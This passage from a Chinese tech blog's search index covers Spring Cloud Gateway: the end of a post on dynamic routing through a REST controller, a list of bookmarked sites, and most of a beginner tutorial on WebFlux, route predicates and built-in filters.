route fail: " + e.getMessage()); return false; } try { routeDefinitionWriter.save(Mono.just(definition)).subscribe(); notifyChanged(); return true; } catch (Exception e) { logger.error("update route fail: " + e.getMessage()); return false; } } /** * 删除路由 * * @param id * @return */ public boolean delete(String id) { try { this.routeDefinitionWriter.delete(Mono.just(id)).subscribe(); notifyChanged(); return true; } catch (Exception e) { logger.error("delete route fail: " + e.getMessage()); return false; } } /** * 装配路由配置信息 * * @param gwdefinition * @return */ public RouteDefinition assembleRouteDefinition(GatewayRouteDefinition gwdefinition) { RouteDefinition definition = new RouteDefinition(); // ID definition.setId(gwdefinition.getId()); // Predicates List&lt;PredicateDefinition&gt; pdList = new ArrayList&lt;&gt;(); for (GatewayPredicateDefinition gpDefinition : gwdefinition.getPredicates()) { PredicateDefinition predicate = new PredicateDefinition(); predicate.setArgs(gpDefinition.getArgs()); predicate.setName(gpDefinition.getName()); pdList.add(predicate); } definition.setPredicates(pdList); // Filters List&lt;FilterDefinition&gt; fdList = new ArrayList&lt;&gt;(); for (GatewayFilterDefinition gfDefinition : gwdefinition.getFilters()) { FilterDefinition filter = new FilterDefinition(); filter.setArgs(gfDefinition.getArgs()); filter.setName(gfDefinition.getName()); fdList.add(filter); } definition.setFilters(fdList); // URI URI uri = UriComponentsBuilder.fromUriString(gwdefinition.getUri()).build().toUri(); definition.setUri(uri); return definition; }} 编写 Rest 控制器，对外暴露 Rest API 123456789101112131415161718192021222324252627282930313233343536373839404142@RestController@RequestMapping("/route")public class RouteController { @Autowired private DynamicRouteServiceImpl dynamicRouteService; /** * 增加路由 * * @param gwdefinition * @return */ @PostMapping("/add") public String add(@RequestBody GatewayRouteDefinition gwdefinition) { RouteDefinition definition = dynamicRouteService.assembleRouteDefinition(gwdefinition); return this.dynamicRouteService.add(definition) ? "success" : "fail"; } /** * 删除路由 * * @param id * @return */ @GetMapping("/delete/{id}") public String delete(@PathVariable String id) { return this.dynamicRouteService.delete(id) ? "success" : "fail"; } /** * 更新路由 * * @param gwdefinition * @return */ @PostMapping("/update") public String update(@RequestBody GatewayRouteDefinition gwdefinition) { RouteDefinition definition = dynamicRouteService.assembleRouteDefinition(gwdefinition); return this.dynamicRouteService.update(definition) ? "success" : "fail"; }} 编写应用的启动主类 1234567@SpringBootApplicationpublic class GatewayServerApplication { public static void main(String[] args) { SpringApplication.run(GatewayServerApplication.class, args); }} 编写 application.yml 配置文件： 1234567891011121314server: port: 9090spring: application: name: gateway-servermanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 测试结果 i. 启动 gateway 应用ii. 访问 http://127.0.0.1:9090/actuator/gateway/routes，此时返回的路由信息应该为空 []iii. 通过 Postman 访问 http://127.0.0.1:9090/route/add，发起 Post 请求添加路由配置信息，其中需要提交的 JSON 数据如下： 1234567891011121314{ "filters": [], "id": "jd_route", "order": 0, "predicates": [ { "args": { "pattern": "/jd" }, "name": "Path" } ], "uri": "http://www.jd.com"} iiii. 再次访问 http://127.0.0.1:9090/actuator/gateway/routes，此时应该可以返回上面添加的路由配置信息iiiii. 访问 http://127.0.0.1:9090/jd，发现可以正常跳转到京东商城的首页，说明上面添加的路由配置生效了iiiiii. 通过 Postman 访问 http://127.0.0.1:9090/route/update，发起 Post 请求更改路由配置信息，其中需要提交的 JSON 数据如下： 1234567891011121314{ "filters": [], "id": "jd_route", "order": 0, "predicates": [ { "args": { "pattern": "/jd" }, "name": "Path" } ], "uri": "http://www.taobao.com"} iiiiiii. 访问 http://127.0.0.1:9090/actuator/gateway/routes，可以发现返回的路由配置信息已经被修改了iiiiiiii. 访问 http://127.0.0.1:9090/jd，发现可以成功跳转到淘宝网iiiiiiiii. 通过 Postman 访问 http://127.0.0.1:9090/route/delete/jd_route，发起 Get 请求删除路由配置信息 最后附上 JSON 版的完整路由配置示例 1234567891011121314151617181920212223242526{ "filters": [ { "args": { "name": "hystrix", "fallbackUri": "forward:/fallback" }, "name": "Hystrix" }, { "args": {}, "name": "RateLimit" } ], "id": "jd_route", "order": 0, "predicates": [ { "args": { "pattern": "/jd" }, "name": "Path" } ], "uri": "http://www.jd.com"} Gateway 集群下的动态路由实现上面的示例简单地实现了单机 Gateway 的动态路由，单机 Gateway 中的路由配置信息保存在当前实例的内存中，实例重启后会丢失路由配置信息，同时无法做到整个 Gateway 集群的动态路由控制。通过分析 Spring Cloud Gateway 源码可以发现，默认的 RouteDefinitionWriter 实现类是 InMemoryRouteDefinitionRepository。而 RouteDefinitionRepository 继承了 RouteDefinitionWriter，是 Spring Cloud Gateway 官方预留的接口，因此可以通过下面两种方式来实现集群下的动态路由控制：RouteDefinitionWriter 接口和 RouteDefinitionRepository 接口。在这里推荐实现 RouteDefinitionRepository 这个接口，从数据库或者从配置中心获取路由进行动态配置；具体可以参考上面单机版的动态路由实现，在这里不再累述。 参考资料 Spring Cloud Gateway（Greenwich.SR1） 整合 Swagger2 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"日常网站收藏",url:"/posts/16fab331.html",text:'博客 云风的 BLOG 美团官方博客 电影资源 人人电影网 人人电影网（备用） PDF 资源 aibooks Java 菜市场 GitHub PDF 电子书整理 Docker 加速 Docker 的安装包以及周边高速镜像 在线常用开发工具 Tools Fun Json 在线工具 Cron 在线工具 GitHub 开源文档与书籍 书栈网 网站测速、网站优化工具 站长工具 - 网速测试 GTmetrix - 网站速度诊断 Webkaka - 网站速度测试 Webkaka - 网站速度诊断 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"生活随笔"},{title:"Gateway 入门教程 - 基础篇",url:"/posts/ec48bc77.html",text:'Reactor 与 WebFlux 介绍Reactor 是什么为了应对高并发的服务器端开发，在 2009 年 的时候，微软提出了一个更优雅地实现异步编程的方式 - Reactive Programming，中文名是响应式编程或者叫反应式编程。随后，其它技术也迅速地跟上了脚步，像 ES6 通过 Promise 引入了类似的异步编程方式。Netflix 和 TypeSafe 公司也提供了 RxJava、Scala、Akka 技术，让 Java 平台也有了能够实现响应式编程的框架，现在比较熟知的 Hystrix 就是以 RxJava 为基础开发的。到了 2017 年，虽然已经有不少公司在实践响应式编程，但整体来说应用范围依旧不大，主要原因在于缺少简单易用的技术将响应式编程推广普及，诸如 MVC 框架、HTTP 客户端、数据库技术等整合。终于，在 2017 年 9 月 28 日，Spring 5 正式发布，而 Spring 5 其最大的意义就是将响应式编程技术的普及向前推进一大步。在背后支持 Spring 5 响应式编程的框架正是 Reactor，它是由 Pivotal 公司（开发 Spring 等技术的公司）开发的，实现了 Reactive Programming 思想，符合 Reactive Streams 规范（Reactive Streams 是由 Netflix、TypeSafe、Pivotal 等公司发起的）的一项技术。Reactive 与 Servlet 的技术栈对比图如下： WebFlux 是什么Spring WebFlux 是 Spring 5.0 引入的新的响应式框架，区别于 Spring MVC，它不需要依赖 Servlet API，采用异步非阻塞的架构，底层基于 Reactor 来实现响应式流规范。因此，Spring WebFlux 特别适合应用在 I/O 密集型的服务中，比如微服务网关这样的应用中。在传统的 Web 架构中，比如 Struts2、Spring MVC 等都是基于 Servlet API 与 Servlet 容器基础之上运行的，使用的是同步阻塞式 I/O 模型。但是在 Servlet 3.1 之后有了异步非阻塞的支持，而 Spring WebFlux 采用的就是典型的异步非阻塞架构，它的核心是基于 Reactor 的相关 API 实现。相对于传统的 Web 架构来说，Spring WebFlux 可以运行在诸如 Netty 及支持 Servlet 3.1+ 的容器（Tomcat、Jetty、Undertow）之上，支持异步非阻塞式 I/O 模型 + 函数式编程（依赖 JDK 8）。根据官方的说明，Spring WebFlux 并不能使接口的响应时间缩短，它仅仅能够提升吞吐量和伸缩性。Spring WebFlux 与 传统 Web 架构的对比图如下： 首先需要明确的一点就是，Spring WebFlux 不是 Spring MVC 的替代方案！虽然 Spring WebFlux 也可以运行在 Servlet 容器之上（Servlet 3.1+），但是 Spring WebFlux 主要还是应用在适合使用异步非阻塞模型的业务场景。而 Spring MVC 是同步阻塞的，如果项目在 Spring MVC 框架中大量使用了非同步方案，那么 Spring WebFlux 才是适用，否则使用 Spring MVC 才是首选。在微服务架构中，Spring MVC 和 Spring WebFlux 可以混合使用（不是指在同一个应用内），比如上面已经提到的，对于那些 I/O 密集型服务（如网关）就可以使用 Spring WebFlux 来实现。Spring MVC 和 Spring WebFlux 的对比图如下： Spring WebFlux 默认情况下使用 Netty 作为服务器 Spring WebFlux 暂时不支持 MySQL，支持 Redis、MongoDB、PostgreSQL Spring WebFlux 使用的响应式流并不是用 JDK 9 提供的，而是基于 Reactor 响应式流库 Spring WebFlux 也可以使用 Spring MVC 注解，如 @Controller，方便在两个 Web 框架中自由转换 Spring WebFlux 与 Spring MVC 都可以使用 Tomcat、Jetty、Undertow 等 Servlet 容器（Servlet 3.1+） Spring MVC 因为是使用的同步阻塞式 I/O 模型，更方便开发人员开发和测试代码；一般来说，如果 Spring MVC 能够满足的场景，就尽量不要用 Spring WebFlux Spring Cloud Gateway 介绍Spring Cloud Gateway 是什么Spring Cloud Gateway 是 Spring 官方基于 Spring 5.x、Spring Boot 2.x、Spring WebFlux 和 Reactor 等技术开发的网关，旨在为微服务架构提供简单、有效且统一的 API 路由管理方式。Spring Cloud Gateway 作为 Spring Cloud 生态系统中的网关，目标是替代 Netflix Zuul 1.x。在 Spring Boot 2.0 以上版本中，并没有对 Zuul 2.0 以上最新高性能版本进行集成，仍然使用 Zuul 1.x 非 Reactor 模式（基于 Servlet 2.5 阻塞架构）的旧版本。Spring Cloud Gateway 其不仅提供统一的路由方式，并且还基于 Filter 链的方式提供了网关基本的功能，例如：熔断、重试、安全、监控 / 指标、限流等，更多资料可参考：Gateway 官方英文文档。 Spring Cloud Gateway 的核心概念网关提供 API 全托管服务，丰富的 API 管理功能，辅助企业管理大规模的 API，以降低管理成本和安全风险，包括协议适配、协议转发、安全策略（WAF）、防刷、流量、监控日志等功能。一般来说，网关对外暴露的 URL 或者接口信息，统称为路由信息。如果研发过网关中间件，或者使用或了解过 Zuul 的开发者，会知道网关的核心肯定是 Filter 以及 Filter Chain（Filter 责任链）。Spring Cloud Gateway 也具有路由和 Filter 的概念，其中最重要的几个概念如下： 路由（route）：路由是网关最基础的部分，路由信息由一个 ID、一个目的 URL、一组断言工厂和一组 Filter 组成；如果路由断言为真，则说明请求的 URL 和配置的路由匹配。 断言（predicate）：Java 8 中的断言函数，Spring Cloud Gateway 中的断言函数输入类型是 Spring 5.0 框架中的 ServerWebExchange。在 Spring Cloud Gateway 中的断言函数允许开发者去定义匹配来自于 Http Request 中的任何信息，比如请求头和参数等。 过滤器（filter）：一个标准的 Spring Web Filter，在 Spring Cloud Gateway 中的 Filter 分为两种类型，分别是 Gateway Filter 和 Global Filter，过滤器 Filter 将会对请求和响应进行修改处理。 Spring Cloud Gateway 的核心原理Spring Cloud Gateway 的核心处理流程如下图所示，Gateway 的客户端会向 Spring Cloud Gateway 发起请求，请求首先会被 HttpWebHandlerAdapter 进行提取组装成网关的上下文，然后网关的上下文会传递给 DispatcherHandler。这里的 DispatcherHandler 是所有请求的分发处理器，DispatcherHandler 主要负责分发请求到对应的处理器，比如将请求分发到对应 RoutePredicateHandlerMapping（路由断言处理映射器）。路由断言处理映射器主要用于路由的查找，以及找到路由后返回对应的 FilteringWebHandler。FilteringWebHandler 主要负责组装 Filter 链表并调用 Filter 执行一系列的 Filter 处理，然后把请求转到后端对应的代理服务处理，处理完毕之后，将 Response 返回到 Gateway 客户端。在 Filter 链中，通过虚线分割 Filter 的原因是，过滤器可以在转发请求之前处理或者接收到被代理服务的返回结果之后处理。所有的 Pre 类型的 Filter 执行完毕之后，才会转发请求到被代理的服务处理。被代理的服务把所有请求处理完毕之后，才会执行 Post 类型的过滤器。值得一提的是，在配置路由的时候，如果不指定端口的话，HTTP 默认设置端口为 80，HTTPS 默认设置端口为 443，Spring Cloud Gateway 的启动容器目前只支持 Netty。 Spring Cloud Gateway 入门案例1. 版本说明在本文中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，特别声明除外，点击下载完整的案例代码。 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下。特别注意，Spring Cloud Gateway 是基于 WebFlux 的，它与 Spring MVC 是不兼容的，如果引用了 spring-boot-starter-web，则需要把 spring-webmvc 排除掉；由于 Spring Cloud Gateway 的启动容器目前只支持 Netty，因此还需要将 spring-boot-starter-tomcat 排除掉。这里也可以引入 spring-boot-starter-webflux 来替代 Spring MVC 的功能，关于 Gateway 的使用，原则上只需要引入 spring-cloud-starter-gateway 即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt;&lt;/properties&gt;&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;${java.version}&lt;/source&gt; &lt;target&gt;${java.version}&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 3. 创建 Gateway 工程 创建 Gateway 的 Maven 工程，配置工程里的 pom.xml 文件 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Gateway 的配置类，使用 Java 流式 API 自定义 RouteLocator 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { // 当访问到 http://127.0.0.1:9090/jd 直接跳转到京东商城的首页 return builder.routes() .route(r -&gt; r.path("/jd") .uri("http://jd.com:80/").id("jd_route") ).build(); }} 创建 Gateway 的主控制类 1234567@SpringBootApplicationpublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} 创建 Gateway 的 application.yml 配置文件，添加开启端点的配置信息，Spring Cloud Gateway 提供了一个 Gateway Actuator，该 EndPiont 提供了关于 Filter 及 Routes 的信息查询以及指定 Route 信息更新的 Rest API 接口 123456789101112131415161718192021server: port: 9090spring: application: name: gateway-serverlogging: level: org.springframework.cloud.gateway: TRACE org.springframework.http.server.reactive: DEBUG org.springframework.web.reactive: DEBUG reactor.ipc.netty: DEBUGmanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 4. 创建 Gateway YML 工程Spring Cloud Gateway 支持两种方式去配置路由信息，上述代码通过 Java 流式 API 自定义 RouteLocator 的方式定义 Spring Cloud Gateway 的路由信息，也可以通过如下 YML 文件的方式配置路由。 创建 Gateway 的 Maven 工程，配置工程里的 pom.xml 文件 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Gateway 的主控制类 1234567@SpringBootApplicationpublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} 创建 Gateway 的 application.yml 配置文件 12345678910111213141516171819202122232425262728server: port: 9091spring: application: name: gateway-server cloud: gateway: routes: #当访问到 http://127.0.0.1:9090/baidu 直接跳转到百度的首页 - id: baidu_route uri: http://baidu.com:80/ predicates: - Path=/baidulogging: level: org.springframework.cloud.gateway: TRACE org.springframework.http.server.reactive: DEBUG org.springframework.web.reactive: DEBUG reactor.ipc.netty: DEBUGmanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 5. 测试结果 分别启动 gateway、gateway-yml 应用 访问 http://127.0.0.1:9090/actuator/gateway/routes，查看返回的所有路由信息，如下图所示： 访问 http://127.0.0.1:9090/jd，查看是否成功跳转到京东商城的首页 访问 http://127.0.0.1:9091/baidu，查看是否成功跳转到百度的首页 Spring Cloud Gateway 的路由断言Spring Cloud Gateway 的路由匹配的功能是以 Spring WebFlux 中的 Handler Mapping 为基础实现的。Spring Cloud Gateway 也是由许多的路由断言工厂组成的，当 Http Request 请求进入 Spring Cloud Gateway 的时候，网关中的路由断言工厂会根据配置的路由规则，对 Http Request 请求进行断言匹配；匹配成功则进行下一步处理，否则断言失败直接返回错误信息。值得一提的是，Spring Cloud Gateway 大多数的路由断言工厂是支持正则表达式匹配的。下面将给出各种路由断言工厂的使用示例，点击下载完整的案例代码。 After 路由断言工厂After 路由断言工厂中会取一个 UTC 时间格式的时间参数，当请求进来的当前时间在配置的 UTC 时间之后，则会成功匹配，否则不能成功匹配。 通过 Java 代码的方式，将 After 路由断言的配置信息配置到路由里去： 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { // 生成比当前时间早一个小时的UTC时间 ZonedDateTime minusTime = LocalDateTime.now().minusHours(1).atZone(ZoneId.systemDefault()); return builder.routes() .route( "after_route", r -&gt; r.after(minusTime).uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 After 路由断言信息：其中的 UTC 时间可以使用 Java 代码生成，例如 ZonedDateTime.now().minusHours(1).format(DateTimeFormatter.ISO_ ZONED_DATE_TIME); 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: after_route uri: http://baidu.com predicates: - After=2019-10-01T21:55:18.146+08:00[Asia/Shanghai] 测试结果： 启动应用，访问 http://127.0.0.1，查看是否成功跳转到百度的首页 更改 UTC 时间为当前时间一个小时后的 UTC 时间，然后再启动应用，访问 http://127.0.0.1，页面会返回 404 错误信息 Before 路由断言工厂Before 路由断言工厂会取一个 UTC 时间格式的时间参数，当请求进来的当前时间在配置的 UTC 时间之前，则会成功匹配，否则不能成功匹配。 通过 Java 代码的方式，将 Before 路由断言的配置信息配置到路由里去： 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { // 生成比当前时间晚一个小时的UTC时间 ZonedDateTime plusTime = LocalDateTime.now().plusHours(1).atZone(ZoneId.systemDefault()); return builder.routes() .route( "before_route", r -&gt; r.before(plusTime).uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Before 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: before_route uri: http://baidu.com predicates: - Before=2019-10-01T21:55:18.146+08:00[Asia/Shanghai] Between 路由断言工厂Between 路由断言工厂会取一个 UTC 时间格式的时间参数，当请求进来的当前时间在配置的 UTC 时间之间，则会成功匹配，否则不能成功匹配。 通过 Java 代码的方式，将 Between 路由断言的配置信息配置到路由里去： 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { ZonedDateTime minusTime = LocalDateTime.now().minusHours(1).atZone(ZoneId.systemDefault()); ZonedDateTime plusTime = LocalDateTime.now().plusHours(1).atZone(ZoneId.systemDefault()); return builder.routes() .route( "between_route", r -&gt; r.between(minusTime, plusTime).uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Between 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: between_route uri: http://baidu.com predicates: - Between=2019-11-10T11:11:11.111 08:00[Asia/Shanghai], 2019-11-12T11:11:11.111 08:00[Asia/Shanghai] Cookie 路由断言工厂Cookie 路由断言工厂会取两个参数，分别是 cookie 名称对应的 key 和 value。当请求中携带的 cookie 和 Cookie 断言工厂中配置的 cookie 一致，则路由匹配成功，否则匹配不成功。 通过 Java 代码的方式，将 Cookie 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "cookie_route", r -&gt; r.cookie("book", "java").uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Cookie 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: cookie_route uri: http://baidu.com predicates: - Cookie=book, java 测试结果 启动 gateway-cookie 应用 在 Postman 中将 book=java 添加到 Cookie，然后访问 http://127.0.0.1，查看是否成功跳转到百度的首页 Header 路由断言工厂Header 路由断言工厂用于根据配置的路由 header 信息进行断言匹配路由，匹配成功进行转发，否则不进行转发。 通过 Java 代码的方式，将 Header 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "header_route", r -&gt; r.header("X-Request-Id", "Peter").uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Header 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: header_route uri: http://baidu.com predicates: - Header=X-Request-Id, Peter 测试结果 启动 gateway-header 应用 在 Postman 中将 X-Request-Id=Peter 添加到 Header，然后访问 http://127.0.0.1，查看是否成功跳转到百度的首页 Host 路由断言工厂Host 路由断言工厂根据配置的 Host，对请求中的 Host 进行断言处理，断言成功则进行路由转发，否则不转发。 通过 Java 代码的方式，将 Host 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "host_route", r -&gt; r.host("**.study.com").uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Host 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: host_route uri: http://baidu.com predicates: - Host=**.study.com 测试结果 编辑系统的 hosts 配置文件，添加域名映射：127.0.0.1 www.study.com 启动 gateway-host 应用 访问 http://www.study.com，查看是否成功跳转到百度的首页 Method 路由断言工厂Method 路由断言工厂会根据路由信息配置的 method 对请求方法是 Get 或者 Post 等进行断言匹配，匹配成功则进行转发，否则处理失败。 通过 Java 代码的方式，将 Method 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "method_route", r -&gt; r.method("GET").uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Method 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: method_route uri: http://baidu.com predicates: - Method=GET Query 路由断言工厂Query 路由断言工厂会从请求中获取两个参数，将请求中参数和 Query 断言路由中的配置进行匹配，比如 http://127.0.0.1?book=java 中的 book=java 和下面的 r.query("book","java") 配置一致，则转发成功，否则转发失败。 通过 Java 代码的方式，将 Query 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "query_route", r -&gt; r.query("book", "java").uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 Query 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: query_route uri: http://baidu.com predicates: - Query=book, java Path 路由断言工厂Path 路由断言工厂接收一个参数，根据 Path 定义好的规则来判断访问的 URI 是否匹配。在下述配置中，如果请求路径为 /blog/detail/，则此路由将匹配；也可以使用表达式，例如 /blog/detail/** 表示匹配 /blog/detail/ 开头的多级 URI。特别注意，下述的 URI 如果不以 / 结尾，那么转发后的 URI 为 http://baidu.com/blog/detail/；若以 / 结尾，转发后的 URI 则为 http://baidu.com/。 通过 Java 代码的方式，将 Path 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "path_route", r -&gt; r.path("/blog/detail/").uri("http://baidu.com/") ) .build(); }} 也可以在 application.yml 文件里配置 Path 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: path_route uri: http://baidu.com/ predicates: - Path=/blog/detail/ Weight 路由断言工厂Weight 路由断言工厂，在 Spring Cloud Gateway 中可以使用它对 URL 进行权重路由，只需在配置时指定分组和权重值即可。下述配置中，添加了两个针对 /test 路径转发的路由定义配置，这两个路由属于同一个权重分组，权重的分组名称为 group。最终的效果是把 /test 接口的 95% 的请求流量分发给服务的 V1 版本，把剩余 5% 的流量分发给服务的 V2 版本，具体的实战案例可参考这里的教程。 12345678910111213141516spring: application: name: gateway-server cloud: gateway: routes: - id: provider-service-v1 uri: http://127.0.0.1:9091/v1/ predicates: - Path=/test - Weight=group, 95 - id: provider-service-v2 uri: http://127.0.0.1:9091/v2/ predicates: - Path=/test - Weight=group, 5 RemoteAddr 路由断言工厂RemoteAddr 路由断言工厂配置一个 IPv4 或 IPv6 网段的字符串或者 IP。当客户端的 IP 地址在网段之内或者和配置的 IP 相同，则成功转发，否则不能转发。例如 192.168.0.1/16 表示一个网段，其中 192.168.0.1 是 IP 地址，16 是子网掩码，当然也可以直接配置一个 IP。 通过 Java 代码的方式，将 RemoteAddr 路由断言的配置信息配置到路由里去： 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "remoteaddr_route", r -&gt; r.remoteAddr("127.0.0.1").uri("http://baidu.com") ) .build(); }} 也可以在 application.yml 文件里配置 RemoteAddr 路由断言信息： 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: remoteaddr_route uri: http://baidu.com predicates: - RemoteAddr=127.0.0.1 Spring Cloud Gateway 的内置 FilterSpring Cloud Gateway 中内置很多的路由过滤工厂，当然也可以根据实际应用场景的需要定制自己的路由过滤器工厂。路由过滤器允许以某种方式修改进来的 HTTP 请求或返回的 HTTP 响应。路由过滤器主要作用于需要处理的特定路由，Spring Cloud Gateway 提供了很多种的过滤器工厂，过滤器的实现类将近二十多个。总得来说，可以分为七类：Header、Parameter、Path、Status、Redirect 跳转、Hytrix 熔断和 RateLimiter 限流。下面将介绍 Spring Cloud Gateway 中常用的 Filter 工厂，点击下载完整的案例代码。 AddRequestHeader 过滤器AddRequestHeader 过滤器工厂用于对匹配上的请求加上 Header： 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("add_request_header_route", r -&gt; r.path("/addRequestHeader") .filters(f -&gt; f.addRequestHeader("X-Request-Id", "Peter")) .uri("http://127.0.0.1:8080/addRequestHeader/") ).build(); }} AddRequestParameter 过滤器AddRequestParameter 